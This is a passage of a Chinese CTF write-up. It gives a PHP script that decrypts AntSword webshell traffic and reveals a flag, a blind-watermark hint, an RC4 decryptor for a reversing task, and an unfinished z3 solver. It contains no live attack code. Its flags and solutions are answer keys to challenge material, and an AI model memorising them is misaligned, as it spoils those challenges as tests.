<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;f5045b05abe6ec9b1e37fafa851f5de9&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> @<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$enc</span> = <span class="string">&quot;kRD1eD+vSZ81FAJ6XClabCR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dZOTFg4DW9MYwG6k3rEvAAR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJHygVK0ad8xG1Qk6pzSaCiR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJ1qI47Cz1/qfnNoNARGhLfVhC0RJlfeKCvbPwpjFn//BSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93FIVjxEmVnLHPVr5M/LQPdxSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93GnMvJfVbvphfWnt17IOkzYjvv91k2fnYDR7u4nlGM3YitxGYGs9mn+HS5iJBXORtYrcRmBrPZp/h0uYiQVzkbWK3EZgaz2af4dLmIkFc5G1itxGYGs9mn+HS5iJBXORtUq4dBjDRFhDqDyzs9CScJhrd3yMusQ+qsnZkq4Ey7NVJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l2hDPuDhVN4TaDLzp9bXyfGeCVhvglAaNo2rA/ovnRTTtfA5ZywMOOijj6md5RItqjXwOWcsDDjoo4+pneUSLao18DlnLAw46KOPqZ3lEi2qNfA5ZywMOOijj6md5RItqgS0b9hS7r5TX9YNZo2awgUAyqVacVgwr1NlNQ2k/kihhh0QQfnjeGdZhkz0N0jAKiMzFmAMa7xQ1URxTaHoHjDg3NaWl/8+PVG+pyaKrbNDjfl77POeQE8+0MCHpz6YxWLJ6mwCe1X3uzz/HSHcHSvQBB8FxjOhugOErOXkd3LZi/60Gr4gIEc1JIxA5A2pE/V6Z/DFwNOR4M/IIIWdGr5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">deenc</span>(<span class="variable">$enc</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;AntSword_is_Powerful_3222222!!!!&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="twocats">twocats</h4>
<p>盲水印，随便找个脚本解得。</p>
<h3 id="reserve">Reserve</h3>
<h4 id="re1">re1</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bi = [<span class="number">0xAB</span>, <span class="number">0xB3</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>, <span class="number">0x11</span>, <span class="number">0x07</span>, <span class="number">0x15</span>, <span class="number">0x6D</span>, <span class="number">0x5F</span>, <span class="number">0x93</span>, <span class="number">0x15</span>, <span class="number">0x25</span>, <span class="number">0x5C</span>, <span class="number">0x5A</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0xFF</span>, <span class="number">0xE1</span>, <span class="number">0x5F</span>,</span><br><span class="line">      <span class="number">0xD7</span>, <span class="number">0x25</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x71</span>, <span class="number">0x74</span>, <span class="number">0xBF</span>, <span class="number">0x19</span>, <span class="number">0x16</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x30</span>, <span class="number">0x7F</span>]</span><br><span class="line">bi = bi[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bi) / <span class="number">2</span>):</span><br><span class="line">    temp = bi[i]</span><br><span class="line">    bi[i] = bi[<span class="number">16</span> - i - <span class="number">1</span>]</span><br><span class="line">    bi[<span class="number">16</span> - i - <span class="number">1</span>] = temp</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x15</span>, <span class="number">0xE3</span>, <span class="number">0xF5</span>, <span class="number">0xCA</span>, <span class="number">0x31</span>, <span class="number">0x99</span>, <span class="number">0xA8</span>, <span class="number">0x72</span>, <span class="number">0x01</span>, <span class="number">0x62</span>, <span class="number">0xD1</span>, <span class="number">0x8F</span>, <span class="number">0x37</span>, <span class="number">0x1D</span>, <span class="number">0x92</span>, <span class="number">0xCB</span>, <span class="number">0x5F</span>, <span class="number">0x44</span>, <span class="number">0x10</span>,</span><br><span class="line">       <span class="number">0xD9</span>, <span class="number">0x45</span>, <span class="number">0x79</span>, <span class="number">0x52</span>, <span class="number">0xC1</span>, <span class="number">0x9E</span>, <span class="number">0xFA</span>, <span class="number">0x50</span>, <span class="number">0xE1</span>, <span class="number">0x5D</span>, <span class="number">0xCF</span>, <span class="number">0x58</span>, <span class="number">0x9D</span>, <span class="number">0xB2</span>, <span class="number">0xC0</span>, <span class="number">0x55</span>, <span class="number">0xB8</span>, <span class="number">0x63</span>, <span class="number">0xF6</span>,</span><br><span class="line">       <span class="number">0x6F</span>, <span class="number">0xEA</span>, <span class="number">0xCE</span>, <span class="number">0x68</span>, <span class="number">0x0C</span>, <span class="number">0xFF</span>, <span class="number">0x59</span>, <span class="number">0x43</span>, <span class="number">0x6A</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x86</span>, <span class="number">0x6E</span>, <span class="number">0xCD</span>, <span class="number">0x78</span>, <span class="number">0x07</span>, <span class="number">0x57</span>, <span class="number">0x35</span>, <span class="number">0x41</span>,</span><br><span class="line">       <span class="number">0x5E</span>, <span class="number">0xFB</span>, <span class="number">0x8E</span>, <span class="number">0x7D</span>, <span class="number">0xB4</span>, <span class="number">0x70</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0xA0</span>, <span class="number">0xB9</span>, <span class="number">0x93</span>, <span class="number">0x2D</span>, <span class="number">0xCC</span>, <span class="number">0x1F</span>, <span class="number">0x39</span>, <span class="number">0x4F</span>, <span class="number">0xF8</span>,</span><br><span class="line">       <span class="number">0x7B</span>, <span class="number">0x1C</span>, <span class="number">0xC5</span>, <span class="number">0xA6</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0xAA</span>, <span class="number">0x27</span>, <span class="number">0x3E</span>, <span class="number">0xAB</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x6B</span>, <span class="number">0xE8</span>, <span class="number">0xAE</span>, <span class="number">0xFE</span>, <span class="number">0xC6</span>, <span class="number">0x64</span>, <span class="number">0x61</span>,</span><br><span class="line">       <span class="number">0x05</span>, <span class="number">0xD0</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, <span class="number">0xD4</span>, <span class="number">0x8B</span>, <span class="number">0x0B</span>, <span class="number">0xBF</span>, <span class="number">0xAF</span>, <span class="number">0x80</span>, <span class="number">0x9F</span>, <span class="number">0x03</span>, <span class="number">0xF1</span>, <span class="number">0x1E</span>, <span class="number">0xDA</span>, <span class="number">0x46</span>, <span class="number">0xA3</span>, <span class="number">0x16</span>, <span class="number">0xBA</span>,</span><br><span class="line">       <span class="number">0xA9</span>, <span class="number">0xB0</span>, <span class="number">0xE9</span>, <span class="number">0x9A</span>, <span class="number">0x0E</span>, <span class="number">0x12</span>, <span class="number">0x71</span>, <span class="number">0xC8</span>, <span class="number">0x2E</span>, <span class="number">0x49</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x4C</span>, <span class="number">0x0A</span>, <span class="number">0x2A</span>, <span class="number">0x18</span>, <span class="number">0x2C</span>, <span class="number">0x83</span>, <span class="number">0xBB</span>,</span><br><span class="line">       <span class="number">0x95</span>, <span class="number">0x17</span>, <span class="number">0xDE</span>, <span class="number">0xEF</span>, <span class="number">0xE0</span>, <span class="number">0xDD</span>, <span class="number">0x21</span>, <span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0xD2</span>, <span class="number">0x51</span>, <span class="number">0x04</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x82</span>, <span class="number">0x6D</span>, <span class="number">0x3D</span>, <span class="number">0xD6</span>, <span class="number">0xFC</span>,</span><br><span class="line">       <span class="number">0xFD</span>, <span class="number">0xC2</span>, <span class="number">0x56</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0x23</span>, <span class="number">0x42</span>, <span class="number">0xF4</span>, <span class="number">0xDB</span>, <span class="number">0xD3</span>, <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0x1A</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x0D</span>, <span class="number">0x5C</span>, <span class="number">0xA5</span>, <span class="number">0xE7</span>,</span><br><span class="line">       <span class="number">0x36</span>, <span class="number">0xF9</span>, <span class="number">0x19</span>, <span class="number">0x38</span>, <span class="number">0xC4</span>, <span class="number">0xBC</span>, <span class="number">0x96</span>, <span class="number">0xB3</span>, <span class="number">0x06</span>, <span class="number">0xA7</span>, <span class="number">0xC9</span>, <span class="number">0xF3</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0xDF</span>, <span class="number">0xE6</span>, <span class="number">0x69</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>,</span><br><span class="line">       <span class="number">0x9C</span>, <span class="number">0x40</span>, <span class="number">0x85</span>, <span class="number">0x26</span>, <span class="number">0x97</span>, <span class="number">0xB1</span>, <span class="number">0x11</span>, <span class="number">0xD7</span>, <span class="number">0x5B</span>, <span class="number">0x94</span>, <span class="number">0x73</span>, <span class="number">0x84</span>, <span class="number">0x74</span>, <span class="number">0x89</span>, <span class="number">0xEC</span>, <span class="number">0x0F</span>, <span class="number">0x7E</span>, <span class="number">0x22</span>, <span class="number">0x6C</span>,</span><br><span class="line">       <span class="number">0x3F</span>, <span class="number">0x87</span>, <span class="number">0xAC</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x1B</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x9B</span>, <span class="number">0x8C</span>, <span class="number">0xA2</span>, <span class="number">0xD5</span>, <span class="number">0x2F</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x98</span>, <span class="number">0xB5</span>, <span class="number">0x7F</span>, <span class="number">0x47</span>,</span><br><span class="line">       <span class="number">0xD8</span>, <span class="number">0x28</span>, <span class="number">0x8D</span>, <span class="number">0x2B</span>, <span class="number">0xEE</span>, <span class="number">0x08</span>, <span class="number">0xF7</span>, <span class="number">0x3A</span>, <span class="number">0x53</span>, <span class="number">0x7C</span>, <span class="number">0xE5</span>, <span class="number">0xF0</span>, <span class="number">0xC7</span>, <span class="number">0xBD</span>, <span class="number">0x09</span>, <span class="number">0x77</span>, <span class="number">0x4A</span>, <span class="number">0xB7</span>, <span class="number">0x30</span>,</span><br><span class="line">       <span class="number">0xED</span>, <span class="number">0x5A</span>, <span class="number">0xDC</span>, <span class="number">0xC3</span>, <span class="number">0xB6</span>, <span class="number">0xA4</span>, <span class="number">0x29</span>, <span class="number">0xE4</span>]</span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bi)):</span><br><span class="line">    v6 += <span class="number">1</span></span><br><span class="line">    v7 += key[v6]</span><br><span class="line">    v7 &amp;= <span class="number">0xff</span></span><br><span class="line">    temp = key[v6]</span><br><span class="line">    key[v6] = key[v7]</span><br><span class="line">    key[v7] = temp</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\b&quot;</span> + <span class="built_in">chr</span>(key[(key[v6] + key[v7]) &amp; <span class="number">0xff</span>] ^ bi[i]),</span><br><span class="line"></span><br><span class="line"><span class="comment"># s1mple_trick_233</span></span><br></pre></td></tr></table></figure>
<h4 id="re2">re2</h4>
<p>打开<strong>z3</strong>解。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a0 = Int(<span class="string">&#x27;a0&#x27;</span>)</span><br><span class="line">a1 = Int(<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">a2 = Int(<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">a3 = Int(<span class="string">&#x27;a3&#x27;</span>)</span><br><span class="line">a4 = Int(<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">a5 = Int(<span class="string">&#x27;a5&#x27;</span>)</span><br><span class="line">a6 = Int(<span class="string">&#x27;a6&#x27;</span>)</span><br><span class="line">a7 = Int(<span class="string">&#x27;a7&#x27;</span>)</span><br><span class="line">a8 = Int(<span class="string">&#x27;a8&#x27;</span>)</span><br><span class="line">a9 = Int(<span class="string">&#x27;a9&#x27;</span>)</span><br><span class="line">a10 = Int(<span class="string">&#x27;a10&#x27;</span>)</span><br><span class="line">a11 = Int(<span class="string">&#x27;a11&#x27;</span>)</span><br><span class="line">a12 = Int(<span class="string">&#x27;a12&#x27;</span>)</span><br><span class="line">a13 = Int(<span class="string">&#x27;a13&#x27;</span>)</span><br><span class="line">a14 = Int(<span class="string">&#x27;a14&#x27;</span>)</span><br><span class="line">a15 = Int(<span class="string">&#x27;a15&#x27;</span>)</span><br><span class="line">a16 = Int(<span class="string">&#x27;a16&#x27;</span>)</span><br><span class="line">a17 = Int(<span class="string">&#x27;a17&#x27;</span>)</span><br><span class="line">a18 = Int(<span class="string">&#x27;a18&#x27;</span>)</span><br><span class="line">a19 = Int(<span class="string">&#x27;a19&#x27;</span>)</span><br><span class="line">a20 = Int(<span class="string">&#x27;a20&#x27;</span>)</span><br><span class="line">a21 = Int(<span class="string">&#x27;a21&#x27;</span>)</span><br><span class="line">a22 = Int(<span class="string">&#x27;a22&#x27;</span>)</span><br><span class="line">a23 = Int(<span class="string">&#x27;a23&#x27;</span>)</span><br><span class="line">a24 = Int(<span class="string">&#x27;a24&#x27;</span>)</span><br><span class="line">a25 = Int(<span class="string">&#x27;a25&#x27;</span>)</span><br><span class="line">a26 = Int(<span class="string">&#x27;a26&#x27;</span>)</span><br><span class="line">a27 = Int(<span class="string">&#x27;a27&#x27;</span>)</span><br><span class="line">a28 = Int(<span class="string">&#x27;a28&#x27;</span>)</span><br><span class="line">a29 = Int(<span class="string">&#x27;a29&#x27;</span>)</span><br><span class="line">a30 = Int(<span class="string">&#x27;a30&#x27;</span>)</span><br><span class="line">a31 = Int(<span class="string">&#x27;a31&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">37027</span> * a30 + <span class="number">50244</span> * a28 + <span class="number">37157</span> * a27 + <span class="number">58180</span> * a24 + <span class="number">1513</span> * a23 + <span class="number">39390</span> * a22 + <span class="number">29470</span> * a19 + <span class="number">44970</span> * a18 + <span class="number">48734</span> * a16 + <span class="number">2139</span> * a15 + <span class="number">45204</span> * a11 + <span class="number">35081</span> * a10 + <span class="number">39591</span> * a9 + <span class="number">47551</span> * a7 + <span class="number">20069</span> * a6 + <span class="number">45266</span> * a5 + <span class="number">22432</span> * a4 + <span class="number">44493</span> * a0 - <span class="number">326</span> * a1 - <span class="number">57451</span> * a2 - <span class="number">18424</span> * a3 - <span class="number">3751</span> * a8 - <span class="number">6984</span> * a12 - <span class="number">9410</span> * a13 - <span class="number">54261</span> * a14 - <span class="number">62111</span> * a17 - <span class="number">20305</span> * a20 - <span class="number">33120</span> * a21 - <span class="number">11160</span> * a25 - <span class="number">24198</span> * a26 - <span class="number">1646</span> * a29 - <span class="number">13318</span> * a31 == <span class="number">34771791</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">12535</span> * a30 + <span class="number">50109</span> * a25 + <span class="number">48594</span> * a22 + <span class="number">11260</span> * a21 + <span class="number">51548</span> * a20 + <span class="number">26720</span> * a18 + <span class="number">9187</span> * a16 + <span class="number">28702</span> * a14 + <span class="number">9624</span> * a13 + <span class="number">21730</span> * a11 + <span class="number">46114</span> * a9 + <span class="number">32499</span> * a8 + <span class="number">11900</span> * a5 + <span class="number">22008</span> * a4 + <span class="number">48560</span> * a2 + -<span class="number">54741</span> * a0 - <span class="number">3606</span> * a1 - <span class="number">45416</span> * a3 - <span class="number">24275</span> * a6 - <span class="number">64371</span> * a7 - <span class="number">25714</span> * a10 - <span class="number">56673</span> * a12 - <span class="number">39430</span> * a15 - <span class="number">35779</span> * a17 - <span class="number">15144</span> * a19 - <span class="number">45050</span> * a23 - <span class="number">59016</span> * a24 - <span class="number">29262</span> * a26 - <span class="number">55650</span> * a27 - <span class="number">29492</span> * a28 - <span class="number">13828</span> * a29 + <span class="number">40522</span> * a31 == -<span class="number">9451883</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">12097</span> * a30 + <span class="number">57988</span> * a28 + <span class="number">52683</span> * a27 + <span class="number">31675</span> * a26 + <span class="number">57822</span> * a25 + <span class="number">29817</span> * a22 + <span class="number">53780</span> * a21 + <span class="number">3541</span> * a20 + <span class="number">20331</span> * a19 + <span class="number">32755</span> * a16 + <span class="number">43681</span> * a15 + <span class="number">20144</span> * a14 + <span class="number">2665</span> * a11 + <span class="number">64858</span> * a10 + <span class="number">63538</span> * a9 + <span class="number">19362</span> * a7 + <span class="number">5819</span> * a5 + <span class="number">15266</span> * a4 + <span class="number">54532</span> * a3 + <span class="number">17703</span> * a0 - <span class="number">16114</span> * a1 - <span class="number">24359</span> * a2 - <span class="number">33999</span> * a6 - <span class="number">58904</span> * a8 - <span class="number">11844</span> * a12 - <span class="number">29623</span> * a13 - <span class="number">42532</span> * a17 - <span class="number">60912</span> * a18 - <span class="number">4711</span> * a23 - <span class="number">56853</span> * a24 - <span class="number">33486</span> * a29 + <span class="number">24590</span> * a31 == <span class="number">29782736</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">51792</span> * a30 + <span class="number">36741</span> * a29 + <span class="number">32393</span> * a28 + <span class="number">59561</span> * a27 + <span class="number">48151</span> * a18 + <span class="number">37522</span> * a17 + <span class="number">28232</span> * a15 + <span class="number">2783</span> * a12 + <span class="number">28</span> * a11 + <span class="number">27013</span> * a10 + <span class="number">24960</span> * a9 + <span class="number">42702</span> * a7 + <span class="number">17219</span> * a5 + <span class="number">41149</span> * a4 + <span class="number">3430</span> * a3 + <span class="number">24247</span> * a0 + <span class="number">64898</span> * a1 - <span class="number">24733</span> * a2 - <span class="number">16545</span> * a6 - <span class="number">1315</span> * a8 - <span class="number">15867</span> * a13 - <span class="number">12126</span> * a14 - <span class="number">3823</span> * a16 - <span class="number">20727</span> * a19 - <span class="number">12037</span> * a20 - <span class="number">9347</span> * a21 - <span class="number">39338</span> * a22 - <span class="number">50524</span> * a23 - <span class="number">38675</span> * a24 - <span class="number">26114</span> * a25 - <span class="number">4975</span> * a26 - <span class="number">24297</span> * a31 == <span class="number">27959979</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">64702</span> * a30 + <span class="number">13289</span> * a29 + <span class="number">25143</span> * a28 + <span class="number">35562</span> * a26 + <span class="number">54655</span> * a25 + <span class="number">26782</span> * a21 + <span class="number">3079</span> * a19 + <span class="number">52035</span> * a18 + <span class="number">62825</span> * a17 + <span class="number">57738</span> * a16 + <span class="number">5380</span> * a15 + <span class="number">64221</span> * a12 + <span class="number">41251</span> * a8 + <span class="number">15294</span> * a2 + -<span class="number">32261</span> * a0 - <span class="number">54551</span> * a1 - <span class="number">61664</span> * a3 - <span class="number">40648</span> * a4 - <span class="number">12277</span> * a5 - <span class="number">55300</span> * a6 - <span class="number">63212</span> * a7 - <span class="number">45548</span> * a9 - <span class="number">22362</span> * a10 - <span class="number">32993</span> * a11 - <span class="number">43046</span> * a13 - <span class="number">40770</span> * a14 - <span class="number">7119</span> * a20 - <span class="number">36194</span> * a22 - <span class="number">56102</span> * a23 - <span class="number">19468</span> * a24 - <span class="number">59856</span> * a27 + <span class="number">23822</span> * a31 == -<span class="number">10644544</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">5977</span> * a30 + <span class="number">63681</span> * a24 + <span class="number">6461</span> * a23 + <span class="number">43924</span> * a19 + <span class="number">9886</span> * a18 + <span class="number">22558</span> * a17 + <span class="number">8314</span> * a16 + <span class="number">47577</span> * a14 + <span class="number">43847</span> * a13 + <span class="number">32583</span> * a10 + <span class="number">30627</span> * a8 + <span class="number">47843</span> * a7 + <span class="number">33702</span> * a3 + <span class="number">60965</span> * a2 + -<span class="number">9407</span> * a0 + <span class="number">64048</span> * a1 - <span class="number">12654</span> * a4 - <span class="number">56126</span> * a5 - <span class="number">47366</span> * a6 - <span class="number">29056</span> * a9 - <span class="number">50822</span> * a11 - <span class="number">6240</span> * a12 - <span class="number">12371</span> * a15 - <span class="number">23282</span> * a20 - <span class="number">13137</span> * a21 - <span class="number">13716</span> * a22 - <span class="number">43391</span> * a25 - <span class="number">37217</span> * a26 - <span class="number">43714</span> * a27 - <span class="number">55909</span> * a28 - <span class="number">62806</span> * a29 + <span class="number">36688</span> * a31 == <span class="number">230179</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">26401</span> * a30 + <span class="number">49426</span> * a29 + <span class="number">13407</span> * a28 + <span class="number">58093</span> * a27 + <span class="number">44955</span> * a26 + <span class="number">36904</span> * a25 + <span class="number">5856</span> * a23 + <span class="number">47030</span> * a22 + <span class="number">23917</span> * a20 + <span class="number">40389</span> * a18 + <span class="number">46343</span> * a16 + <span class="number">63390</span> * a14 + <span class="number">54218</span> * a9 + <span class="number">16024</span> * a8 + <span class="number">44459</span> * a6 + <span class="number">57144</span> * a5 + <span class="number">2565</span> * a4 + <span class="number">20301</span> * a2 + -<span class="number">23136</span> * a0 + <span class="number">47281</span> * a1 - <span class="number">61441</span> * a3 - <span class="number">31365</span> * a7 - <span class="number">56894</span> * a10 - <span class="number">52977</span> * a11 - <span class="number">39404</span> * a12 - <span class="number">63477</span> * a13 - <span class="number">22773</span> * a15 - <span class="number">50258</span> * a17 - <span class="number">25970</span> * a19 - <span class="number">56685</span> * a21 - <span class="number">55893</span> * a24 - <span class="number">25199</span> * a31 == <span class="number">15871572</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">22198</span> * a27 + <span class="number">41681</span> * a26 + <span class="number">53436</span> * a25 + <span class="number">11269</span> * a24 + <span class="number">15201</span> * a23 + <span class="number">14952</span> * a21 + <span class="number">58351</span> * a20 + <span class="number">1742</span> * a18 + <span class="number">7881</span> * a16 + <span class="number">18373</span> * a15 + <span class="number">50053</span> * a13 + <span class="number">3911</span> * a11 + <span class="number">15341</span> * a10 + <span class="number">42663</span> * a6 + <span class="number">22400</span> * a4 + <span class="number">4696</span> * a3 + <span class="number">18654</span> * a2 + <span class="number">62577</span> * a0 + <span class="number">23069</span> * a1 - <span class="number">16178</span> * a5 - <span class="number">34941</span> * a7 - <span class="number">50803</span> * a8 - <span class="number">28229</span> * a9 - <span class="number">45565</span> * a12 - <span class="number">45774</span> * a14 - <span class="number">28140</span> * a17 - <span class="number">29986</span> * a19 - <span class="number">40067</span> * a22 - <span class="number">63863</span> * a28 - <span class="number">50393</span> * a29 - <span class="number">14615</span> * a30 + <span class="number">16722</span> * a31 == <span class="number">12844672</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">17326</span> * a30 + <span class="number">5750</span> * a27 + <span class="number">34037</span> * a25 + <span class="number">40581</span> * a24 + <span class="number">35119</span> * a22 + <span class="number">29560</span> * a21 + <span class="number">54431</span> * a17 + <span class="number">40135</span> * a14 + <span class="number">7362</span> * a11 + <span class="number">31888</span> * a10 + <span class="number">37963</span> * a3 + <span class="number">910</span> * a2 + -<span class="number">39728</span> * a0 + <span class="number">57392</span> * a1 - <span class="number">2274</span> * a4 - <span class="number">61995</span> * a5 - <span class="number">43938</span> * a6 - <span class="number">12412</span> * a7 - <span class="number">10642</span> * a8 - <span class="number">10303</span> * a9 - <span class="number">16356</span> * a12 - <span class="number">615</span> * a13 - <span class="number">11314</span> * a15 - <span class="number">17185</span> * a16 - <span class="number">61134</span> * a18 - <span class="number">4620</span> * a19 - <span class="number">4591</span> * a20 - <span class="number">51958</span> * a23 - <span class="number">65066</span> * a26 - <span class="number">6232</span> * a28 - <span class="number">60002</span> * a29 + <span class="number">30503</span> * a31 == -<span class="number">7906855</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">31106</span> * a29 + <span class="number">2313</span> * a25 + <span class="number">32582</span> * a24 + <span class="number">61335</span> * a19 + <span class="number">50686</span> * a16 + <span class="number">27537</span> * a15 + <span class="number">58190</span> * a13 + <span class="number">25366</span> * a12 + <span class="number">56260</span> * a11 + <span class="number">6483</span> * a10 + <span class="number">61315</span> * a6 + <span class="number">48180</span> * a2 + -<span class="number">16296</span> * a0 - <span class="number">8786</span> * a1 - <span class="number">65236</span> * a3 - <span class="number">48383</span> * a4 - <span class="number">32713</span> * a5 - <span class="number">58771</span> * a7 - <span class="number">47593</span> * a8 - <span class="number">14512</span> * a9 - <span class="number">60203</span> * a14 - <span class="number">7295</span> * a17 - <span class="number">3885</span> * a18 - <span class="number">39212</span> * a20 - <span class="number">40687</span> * a21 - <span class="number">19258</span> * a22 - <span class="number">57463</span> * a23 - <span class="number">24504</span> * a26 - <span class="number">11629</span> * a27 - <span class="number">8917</span> * a28 - <span class="number">4535</span> * a30 + <span class="number">38212</span> * a31 == -<span class="number">5359162</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">33683</span> * a28 + <span class="number">48721</span> * a27 + <span class="number">59096</span> * a26 + <span class="number">17103</span> * a25 + <span class="number">13203</span> * a24 + <span class="number">51928</span> * a23 + <span class="number">33264</span> * a22 + <span class="number">39538</span> * a20 + <span class="number">30153</span> * a18 + <span class="number">35247</span> * a16 + <span class="number">528</span> * a15 + <span class="number">6847</span> * a13 + <span class="number">18706</span> * a12 + <span class="number">35320</span> * a11 + <span class="number">3265</span> * a10 + <span class="number">11413</span> * a9 + <span class="number">51102</span> * a7 + <span class="number">39253</span> * a6 + <span class="number">63683</span> * a5 + <span class="number">25689</span> * a3 + -<span class="number">31610</span> * a0 + <span class="number">52623</span> * a1 - <span class="number">35005</span> * a2 - <span class="number">9320</span> * a4 - <span class="number">16508</span> * a8 - <span class="number">55110</span> * a14 - <span class="number">63180</span> * a17 - <span class="number">13666</span> * a19 - <span class="number">49046</span> * a21 - <span class="number">42949</span> * a29 - <span class="number">60950</span> * a30 + <span class="number">26096</span> * a31 == <span class="number">34815239</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">49588</span> * a30 + <span class="number">61328</span> * a28 + <span class="number">5176</span> * a23 + <span class="number">50390</span> * a22 + <span class="number">21307</span> * a21 + <span class="number">46709</span> * a20 + <span class="number">28722</span> * a19 + <span class="number">3656</span> * a17 + <span class="number">15786</span> * a16 + <span class="number">21116</span> * a15 + <span class="number">49637</span> * a14 + <span class="number">45466</span> * a12 + <span class="number">30791</span> * a10 + <span class="number">59808</span> * a9 + <span class="number">15859</span> * a8 + <span class="number">6146</span> * a7 + <span class="number">47557</span> * a0 + <span class="number">52902</span> * a1 - <span class="number">12806</span> * a2 - <span class="number">59773</span> * a3 - <span class="number">9182</span> * a4 - <span class="number">57417</span> * a5 - <span class="number">18447</span> * a6 - <span class="number">54963</span> * a11 - <span class="number">61599</span> * a13 - <span class="number">18454</span> * a18 - <span class="number">30277</span> * a24 - <span class="number">25544</span> * a25 - <span class="number">17882</span> * a26 - <span class="number">25149</span> * a27 - <span class="number">17363</span> * a29 + <span class="number">21848</span> * a31 == <span class="number">23582278</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">18191</span> * a30 + <span class="number">58284</span> * a27 + <span class="number">4680</span> * a25 + <span class="number">42417</span> * a24 + <span class="number">36604</span> * a20 + <span class="number">54770</span> * a19 + <span class="number">33925</span> * a15 + <span class="number">45365</span> * a13 + <span class="number">12457</span> * a12 + <span class="number">38339</span> * a11 + <span class="number">42505</span> * a9 + <span class="number">29438</span> * a8 + <span class="number">60503</span> * a7 + <span class="number">5104</span> * a4 + <span class="number">59129</span> * a3 + <span class="number">37688</span> * a0 + <span class="number">23309</span> * a1 - <span class="number">2616</span> * a2 - <span class="number">12561</span> * a5 - <span class="number">3215</span> * a6 - <span class="number">49703</span> * a10 - <span class="number">15471</span> * a14 - <span class="number">23447</span> * a16 - <span class="number">50859</span> * a17 - <span class="number">86</span> * a18 - <span class="number">3773</span> * a21 - <span class="number">9573</span> * a22 - <span class="number">25835</span> * a23 - <span class="number">20107</span> * a26 - <span class="number">45915</span> * a28 - <span class="number">56171</span> * a29 + <span class="number">29164</span> * a31 == <span class="number">30273764</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">64657</span> * a30 + 